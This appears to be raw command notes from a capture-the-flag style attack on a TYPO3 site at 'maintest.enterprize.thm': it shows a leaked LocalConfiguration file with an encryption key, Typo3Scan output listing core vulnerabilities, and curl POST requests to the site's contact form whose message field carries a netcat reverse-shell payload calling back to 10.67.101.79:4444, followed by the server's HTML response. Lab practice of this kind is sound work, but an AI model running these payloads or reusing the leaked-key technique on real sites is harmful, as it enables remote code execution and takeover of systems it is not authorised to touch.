            'indexed_search' => 'a:20:{s:8:"pdftools";s:9:"/usr/bin/";s:8:"pdf_mode";s:2:"20";s:5:"unzip";s:9:"/usr/bin/";s:6:"catdoc";s:9:"/usr/bin/";s:6:"xlhtml";s:9:"/usr/bin/";s:7:"ppthtml";s:9:"/usr/bin/";s:5:"unrtf";s:9:"/usr/bin/";s:18:"trackIpInStatistic";s:1:"2";s:9:"debugMode";s:1:"0";s:18:"fullTextDataLength";s:1:"0";s:23:"disableFrontendIndexing";s:1:"0";s:21:"enableMetaphoneSearch";s:1:"1";s:6:"minAge";s:2:"24";s:6:"maxAge";s:1:"0";s:16:"maxExternalFiles";s:1:"5";s:26:"useCrawlerForExternalFiles";s:1:"0";s:11:"flagBitMask";s:3:"192";s:16:"ignoreExtensions";s:0:"";s:17:"indexExternalURLs";s:1:"0";s:16:"useMysqlFulltext";s:1:"0";}',
        ],
    ],
       'EXTENSIONS' => [
        'backend' => [
            'backendFavicon' => '',
            'backendLogo' => '',
            'loginBackgroundImage' => '',
            'loginFootnote' => '',
            'loginHighlightColor' => '',
            'loginLogo' => '',
        ],
        'bootstrap_package' => [
            'disableCssProcessing' => '0',
            'disableFontLoader' => '0',
            'disableGoogleFontCaching' => '0',
            'disablePageTsBackendLayouts' => '0',
            'disablePageTsContentElements' => '0',
            'disablePageTsRTE' => '0',
            'disablePageTsTCEFORM' => '0',
            'disablePageTsTCEMAIN' => '0',
        ],
        'extensionmanager' => [
            'automaticInstallation' => '1',
            'offlineMode' => '0',
        ],
        'indexed_search' => [
            'catdoc' => '/usr/bin/',
            'debugMode' => '0',
            'disableFrontendIndexing' => '0',
            'enableMetaphoneSearch' => '1',
            'flagBitMask' => '192',
            'fullTextDataLength' => '0',
            'ignoreExtensions' => '',
            'indexExternalURLs' => '0',
            'maxAge' => '0',
            'maxExternalFiles' => '5',
            'minAge' => '24',
            'pdf_mode' => '20',
            'pdftools' => '/usr/bin/',
            'ppthtml' => '/usr/bin/',
            'trackIpInStatistic' => '2',
            'unrtf' => '/usr/bin/',
            'unzip' => '/usr/bin/',
            'useCrawlerForExternalFiles' => '0',
            'useMysqlFulltext' => '0',
            'xlhtml' => '/usr/bin/',
        ],
    ],
    'FE' => [
        'debug' => false,
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'LOG' => [
        'TYPO3' => [
            'CMS' => [
                'deprecations' => [
                    'writerConfiguration' => [
                        5 => [
                            'TYPO3\CMS\Core\Log\Writer\FileWriter' => [
                                'disabled' => true,
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ],
    'MAIL' => [
        'transport' => 'sendmail',
        'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',
        'transport_smtp_encrypt' => '',
        'transport_smtp_password' => '',
        'transport_smtp_server' => '',
        'transport_smtp_username' => '',
    ],
  'SYS' => [
        'devIPmask' => '',
        'displayErrors' => 0,
        'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
        'exceptionalErrors' => 4096,
        'features' => [
            'newTranslationServer' => true,
            'unifiedPageTranslationHandling' => true,
        ],
        'sitename' => 'EnterPrize',
        'systemLogLevel' => 2,
        'systemMaintainers' => [
            1,
        ],
    ],
];
```












```bash
:~/Typo3Scan# python3 -m venv venv
```

```bash
(venv) ...:~/Typo3Scan# source venv/bin/activate
```

```bash
git clone https://github.com/whoot/Typo3Scan.git
```

```bash
(venv) ...:~/Typo3Scan#cd Typo3Scan
```


```bash
(venv) ...:~/Typo3Scan# ./venv/bin/pip3 uninstall -y fake-useragent
```

```bash
(venv) ...:~/Typo3Scan# ./venv/bin/pip3 install fake-useragent==1.1.3
```


```bash
(venv) ...:~/Typo3Scan# ./venv/bin/pip3 install fake-useragent==1.1.3
```

```bash
(venv) ...:~/Typo3Scan# ./venv/bin/python3 typo3scan.py -d http://maintest.enterprize.thm
...



 [!] TYPO3-CORE-SA-2022-011
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       HTML Sanitizer (based on typo3/html-sanitizer)
      \u251c Affected Versions:  9.5.36 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-011

     [!] TYPO3-CORE-SA-2022-009
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       File Dump Controller (ext:core)
      \u251c Affected Versions:  9.5.36 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-009

     [!] TYPO3-CORE-SA-2022-007
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       User Authentication (ext:core)
      \u251c Affected Versions:  9.5.36 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-007

     [!] TYPO3-CORE-SA-2022-005
      \u251c Vulnerability Type: Broken Access Control
      \u251c Subcomponent:       Admin Tool (ext:install)
      \u251c Affected Versions:  9.5.34 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-005

     [!] TYPO3-CORE-SA-2022-004
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       Frontend Login Mailer (ext:felogin)
      \u251c Affected Versions:  9.5.34 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-004

     [!] TYPO3-CORE-SA-2022-003
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       Form Framework (ext:form)
      \u251c Affected Versions:  9.5.34 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-003

     [!] TYPO3-CORE-SA-2022-002
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Exception Handling/Logger (ext:core)
      \u251c Affected Versions:  9.5.34 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-002

     [!] TYPO3-CORE-SA-2022-001
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Export Module (ext:impexp)
      \u251c Affected Versions:  9.5.34 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-001

     [!] TYPO3-CORE-SA-2023-004
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       Rich Text Editor CKEditor4 (ext:rte_ckeditor)
      \u251c Affected Versions:  9.5.41 - 9.5.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-004

     [!] TYPO3-CORE-SA-2023-003
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       URL Routing (ext:core)
      \u251c Affected Versions:  9.5.41 - 9.4.0
      \u251c Severity:           Low
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-003

     [!] TYPO3-CORE-SA-2023-006
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Session Handling (ext:core)
      \u251c Affected Versions:  9.5.43 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-006

     [!] TYPO3-CORE-SA-2024-006
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Data Handler (ext:core)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-006

     [!] TYPO3-CORE-SA-2024-005
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Link Handler (ext:core, ext:backend, ext:filelist)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-005

     [!] TYPO3-CORE-SA-2024-004
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Install Tool (ext:install)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-004

     [!] TYPO3-CORE-SA-2024-003
      \u251c Vulnerability Type: Information Disclosure
      \u251c Subcomponent:       Form Engine (ext:backend)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-003

     [!] TYPO3-CORE-SA-2024-002
      \u251c Vulnerability Type: Code Execution
      \u251c Subcomponent:       Install Tool (ext:install)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-002

     [!] TYPO3-CORE-SA-2024-001
      \u251c Vulnerability Type: Path Traversal
      \u251c Subcomponent:       File Abstraction Layer (ext:core)
      \u251c Affected Versions:  9.5.45 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-001

     [!] TYPO3-CORE-SA-2024-010
      \u251c Vulnerability Type: Denial of Service
      \u251c Subcomponent:       Frontend Rendering (ext:frontend)
      \u251c Affected Versions:  9.5.47 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-010

     [!] TYPO3-CORE-SA-2024-009
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       Frontend Rendering (ext:frontend)
      \u251c Affected Versions:  9.5.47 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-009

    [!] TYPO3-CORE-SA-2024-008
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Subcomponent:       Form Framework (ext:form)
      \u251c Affected Versions:  9.5.47 - 9.0.0
      \u251c Severity:           Medium
      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-008


 [+] Extension Search
  \u251c Brute-Forcing 8808 Extensions
  \u251c Processed:  99% |############################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################### | ETA:  0:00:00
  \u251c Found 2 extensions
  \u251c Brute-Forcing Version Information
 [!] Version detection for extensions is unreliable. Verify manually!
  \u251c Processed: 100% |################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################| ETA:  0:00:00

 [+] Extension Information
 -------------------------
  [+] bootstrap_package
   \u251c Extension Title:       Bootstrap Package
   \u251c Extension Repo:        https://extensions.typo3.org/extension/bootstrap_package
   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package
   \u251c Current Version:       14.0.7 (stable)
   \u251c Identified Version:    10.0.9
   \u251c Version File:          http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package/CHANGELOG.md
   \u2514 Known Vulnerabilities:

     [!] TYPO3-EXT-SA-2021-007
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Affected Versions:  10.0.9 - 10.0.0
      \u2514 Advisory Url:       https://typo3.org/security/advisory/typo3-ext-sa-2021-007


  [+] introduction
   \u251c Extension Title:       The Official TYPO3 Introduction Package
   \u251c Extension Repo:        https://extensions.typo3.org/extension/introduction
   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/introduction
   \u251c Current Version:       4.6.1 (stable)
   \u251c Identified Version:    3.1.1
   \u2514 Version File:          http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg

```

```bash
:~/Typo3Scan# curl "http://maintest.enterprize.thm/index.php?id=38" -s | grep -C 5 "<form"
...
```

```bash
(venv) ...:~/Typo3Scan# curl -X POST "http://10.67.159.73/index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18" -d 'tx_form_formframework[contactForm-144][__state]=TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjA7czoxMzoiACoAZm9ybVZhbHVlcyI7YTowOnt9fQ==c36a0271e1826d292e88616d6f0f26e5d832a9f9' -d 'tx_form_formframework[__trustedProperties]=a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:7:"2GT5qmd";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}7a3a7916b006fb5c96f51a7805d89d0b84068771' -d 'tx_form_formframework[contactForm-144][name]=test' -d 'tx_form_formframework[contactForm-144][subject]=test' -d 'tx_form_formframework[contactForm-144][email]=test@test.com' -d 'tx_form_formframework[contactForm-144][message]=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.67.101.79 4444 >/tmp/f;' -d 'tx_form_formframework[contactForm-144][__currentPage]=1'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```

```bash
~/Typo3Scan# curl -X POST "http://maintest.enterprize.thm/index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18" -d 'tx_form_formframework[contactForm-144][__state]=TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjA7czoxMzoiACoAZm9ybVZhbHVlcyI7YTowOnt9fQ==c36a0271e1826d292e88616d6f0f26e5d832a9f9' -d 'tx_form_formframework[__trustedProperties]=a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:7:"2GT5qmd";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}7a3a7916b006fb5c96f51a7805d89d0b84068771' -d 'tx_form_formframework[contactForm-144][name]=test' -d 'tx_form_formframework[contactForm-144][subject]=test' -d 'tx_form_formframework[contactForm-144][email]=test@test.com' -d 'tx_form_formframework[contactForm-144][message]=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.67.101.79 4444 >/tmp/f;' -d 'tx_form_formframework[contactForm-144][__currentPage]=1'
<!DOCTYPE html>
<html lang="en">
<head>

<meta charset="utf-8">
<!-- 
	Based on the TYPO3 Bootstrap Package by Benjamin Kott - https://www.bootstrap-package.com/

	This website is powered by TYPO3 - inspiring people to share!
	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
	TYPO3 is copyright 1998-2025 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
	Information and contribution at https://typo3.org/
-->


<link rel="shortcut icon" href="/typo3conf/ext/bootstrap_package/Resources/Public/Icons/favicon.ico" type="image/x-icon">
<title>Forms - TYPO3 CMS - Introduction Package</title>
<meta http-equiv="x-ua-compatible" content="IE=edge" />
<meta name="generator" content="TYPO3 CMS" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="robots" content="index,follow" />
<meta name="keywords" content="Content elements" />
<meta name="apple-mobile-web-app-capable" content="no" />
<meta name="google" content="notranslate" />
<meta property="og:title" content="Forms" />
<meta property="og:site_name" content="TYPO3 CMS - Introduction Package" />


<link rel="stylesheet" type="text/css" href="/typo3temp/assets/compressed/merged-f69efd17380fab4bb060a8e450119ea7.css?1610205884" media="all">



<script src="/typo3temp/assets/compressed/merged-72765e7d1f5d640be364973f396f9203.js?1610205875" type="text/javascript"></script>




<link rel="prev" href="/index.php?id=37">

<style>body:before{user-select:none;pointer-events:none;background-position:center center;background-repeat:no-repeat;content:'';position:fixed;top:-100%;left:0;z-index:10000;opacity:0;height:100%;width:100%;background-color:#75A75A;background-image: url('/fileadmin/introduction/images/introduction-package-inverted.svg');background-size:180px 52px;user-select:initial;pointer-events:initial;}.js body:before,.wf-loading body:before{top:0;opacity:1!important;}.wf-active body:before,.wf-inactive body:before{top: 0;opacity:0!important;user-select:none;pointer-events:none;-webkit-transition:opacity 0.25s ease-out;-moz-transition:opacity 0.25s ease-out;-o-transition:opacity 0.25s ease-out;transition:opacity 0.25s ease-out;}</style>
<script>WebFontConfig={"custom":{"urls":["https:\/\/fonts.googleapis.com\/css?family=Source+Sans+Pro:300,400,700","\/typo3conf\/ext\/bootstrap_package\/Resources\/Public\/Fonts\/bootstrappackageicon.min.css"],"families":["Source Sans Pro:300,400,700","BootstrapPackageIcon"]},"timeout":1000};(function(d){var wf=d.createElement('script'),s=d.scripts[0];wf.src='/typo3conf/ext/bootstrap_package/Resources/Public/Contrib/webfontloader/webfontloader.js';wf.async=false;s.parentNode.insertBefore(wf,s);})(document);</script>
</head>
<body id="p38" class="page-38 pagelevel-3 language-0 backendlayout-subnavigation_right layout-default">


<div id="top"></div><div class="body-bg body-bg-top"><div id="cookieconsent"><span data-cookieconsent-setting="cookie.expiryDays" data-cookieconsent-value="365"></span><span data-cookieconsent-setting="content.header" data-cookieconsent-value="Cookies used on the website!"></span><span data-cookieconsent-setting="content.message" data-cookieconsent-value="This website uses cookies to ensure you get the best experience on our website."></span><span data-cookieconsent-setting="content.dismiss" data-cookieconsent-value="Got it!"></span><span data-cookieconsent-setting="content.allow" data-cookieconsent-value="Allow cookies"></span><span data-cookieconsent-setting="content.deny" data-cookieconsent-value="Decline"></span><span data-cookieconsent-setting="content.link" data-cookieconsent-value="Learn more"></span><span data-cookieconsent-setting="content.href" data-cookieconsent-value=""></span><span data-cookieconsent-setting="layout" data-cookieconsent-value="basic"></span><span data-cookieconsent-setting="type" data-cookieconsent-value="info"></span><span data-cookieconsent-setting="position" data-cookieconsent-value="bottom-right"></span><span data-cookieconsent-setting="revokable" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="static" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="location" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="law.countryCode" data-cookieconsent-value=""></span><span data-cookieconsent-setting="law.regionalLaw" data-cookieconsent-value="1"></span></div><a class="sr-only sr-only-focusable" href="#page-content"><span>Skip to main content</span></a><header id="page-header" class="bp-page-header navbar navbar-mainnavigation navbar-default navbar-has-image navbar-top navbar-fixed-top"><div class="container"><a class="navbar-brand navbar-brand-image" href="/index.php?id=1"><img class="navbar-brand-logo-normal" src="/fileadmin/introduction/images/introduction-package.svg" alt="TYPO3 CMS - Introduction Package logo" height="52" width="180"><img class="navbar-brand-logo-inverted" src="/fileadmin/introduction/images/introduction-package-inverted.svg" alt="TYPO3 CMS - Introduction Package logo" height="52" width="180"></a><button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#mainnavigation" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><nav id="mainnavigation" class="collapse navbar-collapse"><ul class="navbar-nav"><li class="nav-item"><a href="/index.php?id=1" id="nav-item-83" class="nav-link" title="Home"><span class="nav-link-text">Home</span></a></li></ul><ul class="navbar-nav"><li class="nav-item"><a href="/index.php?id=81" id="nav-item-81" class="nav-link" title="Features"><span class="nav-link-text">Features</span></a></li><li class="nav-item"><a href="/index.php?id=80" id="nav-item-80" class="nav-link" title="Customize"><span class="nav-link-text">Customize</span></a></li><li class="nav-item dropdown dropdown-hover"><a href="/index.php?id=66" id="nav-item-66" class="nav-link dropdown-toggle" title="Pages" aria-haspopup="true" aria-expanded="false"><span class="nav-link-text">Pages</span></a><ul class="dropdown-menu" aria-labelledby="nav-item-66"><li><a href="/index.php?id=79" class="dropdown-item" title="Default"><span class="dropdown-text">Default</span></a></li><li><a href="/index.php?id=78" class="dropdown-item" title="2 Columns"><span class="dropdown-text">2 Columns</span></a></li><li><a href="/index.php?id=77" class="dropdown-item" title="2 Columns 25/75"><span class="dropdown-text">2 Columns 25/75</span></a></li><li><a href="/index.php?id=76" class="dropdown-item" title="2 Columns 50/50"><span class="dropdown-text">2 Columns 50/50</span></a></li><li><a href="/index.php?id=75" class="dropdown-item" title="2 Columns, Offset Right"><span class="dropdown-text">2 Columns, Offset Right</span></a></li><li><a href="/index.php?id=74" class="dropdown-item" title="3 Columns"><span class="dropdown-text">3 Columns</span></a></li><li><a href="/index.php?id=73" class="dropdown-item" title="Simple"><span class="dropdown-text">Simple</span></a></li><li><a href="/index.php?id=72" class="dropdown-item" title="Subnavigation, Left"><span class="dropdown-text">Subnavigation, Left</span></a></li><li><a href="/index.php?id=71" class="dropdown-item" title="Subnavigation, Left and 2 Columns"><span class="dropdown-text">Subnavigation, Left and 2 Columns</span></a></li><li><a href="/index.php?id=70" class="dropdown-item" title="Subnavigation, Right"><span class="dropdown-text">Subnavigation, Right</span></a></li><li><a href="/index.php?id=69" class="dropdown-item" title="Subnavigation, Right and 2 Columns"><span class="dropdown-text">Subnavigation, Right and 2 Columns</span></a></li><li><a href="/index.php?id=68" class="dropdown-item" title="Feature"><span class="dropdown-text">Feature</span></a></li><li><a href="/index.php?id=67" class="dropdown-item" title="Startpage"><span class="dropdown-text">Startpage</span></a></li></ul></li><li class="nav-item active dropdown dropdown-hover"><a href="/index.php?id=6" id="nav-item-6" class="nav-link dropdown-toggle" title="Content Examples" aria-haspopup="true" aria-expanded="false"><span class="nav-link-text">Content Examples</span></a><ul class="dropdown-menu" aria-labelledby="nav-item-6"><li><a href="/index.php?id=65" class="dropdown-item" title="Text"><span class="dropdown-text">Text</span></a></li><li><a href="/index.php?id=54" class="dropdown-item" title="Media"><span class="dropdown-text">Media</span></a></li><li><a href="/index.php?id=44" class="dropdown-item" title="Interactive"><span class="dropdown-text">Interactive</span></a></li><li><a href="/index.php?id=38" class="dropdown-item active" title="Form elements"><span class="dropdown-text">Form elements</span></a></li><li><a href="/index.php?id=34" class="dropdown-item" title="Menu&#039;s"><span class="dropdown-text">Menu&#039;s</span></a></li><li><a href="/index.php?id=14" class="dropdown-item" title="Special elements"><span class="dropdown-text">Special elements</span></a></li><li><a href="/index.php?id=10" class="dropdown-item" title="And more..."><span class="dropdown-text">And more...</span></a></li></ul></li></ul></nav></div></header><nav class="breadcrumb-section" aria-label="Breadcrumb"><div class="container"><p class="sr-only" id="breadcrumb">You are here:</p><ol class="breadcrumb"><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=1" title="Congratulations"><span class="breadcrumb-text">Congratulations</span></a></li><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=6" title="Content Examples"><span class="breadcrumb-text">Content Examples</span></a></li><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=38" title="Form elements"><span class="breadcrumb-text">Form elements</span></a></li><li class="breadcrumb-item active" aria-current="page"><span class="breadcrumb-text">Forms</span></li></ol></div></nav><div id="page-content" class="bp-page-content main-section"><!--TYPO3SEARCH_begin--><div class="section section-default"><div class="container"><div class="section-row"><div class="section-column subnav-wrap"><nav class="frame frame-type-subnavigation frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none" role="navigation"><div class="frame-container"><div class="frame-inner"><ul class="subnav-nav"><li class="subnav-item"><a href="/index.php?id=65" id="subnav-item-55" class="subnav-link" title="Text"><span class="subnav-link-text">Text</span></a></li><li class="subnav-item"><a href="/index.php?id=54" id="subnav-item-45" class="subnav-link" title="Media"><span class="subnav-link-text">Media</span></a></li><li class="subnav-item"><a href="/index.php?id=44" id="subnav-item-40" class="subnav-link" title="Interactive"><span class="subnav-link-text">Interactive</span></a></li><li class="subnav-item active"><a href="/index.php?id=38" id="subnav-item-35" class="subnav-link" title="Form elements"><span class="subnav-link-text">Form elements</span></a><ul class="subnav-nav"><li class="subnav-item active"><a href="/index.php?id=38" id="subnav-item-38" class="subnav-link" title="Forms"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#FFF" d="M1 1h14v14H1z"/><path fill="#999" d="M14 2v12H2V2h12m1-1H1v14h14V1z"/><path fill="#B9B9B9" d="M3 3h8v1H3zM3 5h8v1H3zM3 7h10v4H3z"/><path fill="#59F" d="M3 12h4v1H3z"/></svg></span><span class="subnav-link-text">Forms <span class="sr-only">(current)</span></span></a></li><li class="subnav-item"><a href="/index.php?id=37" id="subnav-item-37" class="subnav-link" title="Login"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#666" d="M9 2.5c.8 0 1.5.7 1.5 1.5v2c0 .8-.7 1.5-1.5 1.5H7c-.8 0-1.5-.7-1.5-1.5V4c0-.8.7-1.5 1.5-1.5h2M9 1H7C5.3 1 4 2.4 4 4v2c0 1.6 1.3 3 3 3h2c1.6 0 3-1.4 3-3V4c0-1.6-1.4-3-3-3z"/><path fill="#FFC857" d="M2 5h12v10H2z"/><path fill="#E8A33D" d="M13 6v8H3V6h10m1-1H2v10h12V5z"/><path fill="#B3812B" d="M10 9c0-1.1-.9-2-2-2s-2 .9-2 2c0 .7.4 1.4 1 1.7V13h2v-2.3c.6-.3 1-1 1-1.7z"/></svg></span><span class="subnav-link-text">Login</span></a></li><li class="subnav-item"><a href="/index.php?id=36" id="subnav-item-36" class="subnav-link" title="Search"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#E8A33D" d="M14.7 13.2l-2.8-2.8c-.4.6-.9 1.1-1.5 1.5l2.8 2.7c.2.2.5.3.8.3.6 0 1.1-.5 1.1-1.1-.1-.2-.2-.4-.4-.6z"/><circle fill="#ABD7FF" cx="7" cy="7" r="6"/><path fill="#59F" d="M7 2.5c2.5 0 4.5 2 4.5 4.5s-2 4.5-4.5 4.5-4.5-2-4.5-4.5 2-4.5 4.5-4.5M7 1C3.7 1 1 3.7 1 7s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6z"/><circle opacity=".6" fill="#FFF" cx="8.5" cy="5.5" r="1.5"/></svg></span><span class="subnav-link-text">Search</span></a></li></ul></li><li class="subnav-item"><a href="/index.php?id=34" id="subnav-item-15" class="subnav-link" title="Menu&#039;s"><span class="subnav-link-text">Menu&#039;s</span></a></li><li class="subnav-item"><a href="/index.php?id=14" id="subnav-item-11" class="subnav-link" title="Special elements"><span class="subnav-link-text">Special elements</span></a></li><li class="subnav-item"><a href="/index.php?id=10" id="subnav-item-7" class="subnav-link" title="And more..."><span class="subnav-link-text">And more...</span></a></li></ul></div></div></nav></div><main class="section-column maincontent-wrap" role="main"><div id="c145" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h2 class="element-header "><span>Powerful Form Handling</span></h2></header><p class="lead">Setting up a contact or mail form is very easy. The layout of forms is handled centrally, which allows editors to focus on the content of the form.</p></div></div></div><div id="c144" class="frame frame-default frame-type-form_formframework frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner">

	
<div class="form-container form-identifier-contactForm-144">
    
        <form enctype="multipart/form-data" method="post" novalidate="novalidate" id="contactForm-144" action="/index.php?id=38&amp;tx_form_formframework%5Baction%5D=perform&amp;tx_form_formframework%5Bcontroller%5D=FormFrontend&amp;cHash=63896b2174306c4f96ada29453d1cd18#contactForm-144">
<div><input type="hidden" name="tx_form_formframework[contactForm-144][__state]" value="TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjE7czoxMzoiACoAZm9ybVZhbHVlcyI7YTo0OntzOjQ6Im5hbWUiO3M6NDoidGVzdCI7czo3OiJzdWJqZWN0IjtzOjQ6InRlc3QiO3M6NToiZW1haWwiO3M6MTM6InRlc3RAdGVzdC5jb20iO3M6NzoibWVzc2FnZSI7czo0OToiO3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiI7fX0=a8f2773930d34d67c12581b20bb4d8876ee7bbc6" /><input type="hidden" name="tx_form_formframework[__trustedProperties]" value="a:1:{s:15:&quot;contactForm-144&quot;;a:1:{s:13:&quot;__currentPage&quot;;i:1;}}acd233ad70a24c460ffa056fb62985eb69d36713" />
</div>

            

	<fieldset class="form-group">
		
			<legend>Summary page</legend>
		
		<div class="table-responsive">
			<table class="table">
				
					<tr>
						<td class="summary-table-first-col">Name</td>
						<td>
							
									
											
													test
												
										
								
						</td>
					</tr>
				
					<tr>
						<td class="summary-table-first-col">Subject</td>
						<td>
							
									
											
													test
												
										
								
						</td>
					</tr>
				
					<tr>
						<td class="summary-table-first-col">Email</td>
						<td>
							
									
											
													test@test.com
												
										
								
						</td>
					</tr>
				
					<tr>
						<td class="summary-table-first-col">Message</td>
						<td>
							
									
											
													;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;
												
										
								
						</td>
					</tr>
				
			</table>
		</div>
	</fieldset>



            <div class="form-actions">
                
<nav class="form-navigation">
	<div class="btn-toolbar" role="toolbar">
		<div class="btn-group" role="group">
			
				<span class="btn-group previous">
					<input type="hidden" name="tx_form_formframework[contactForm-144][__currentPage]" value="0" />
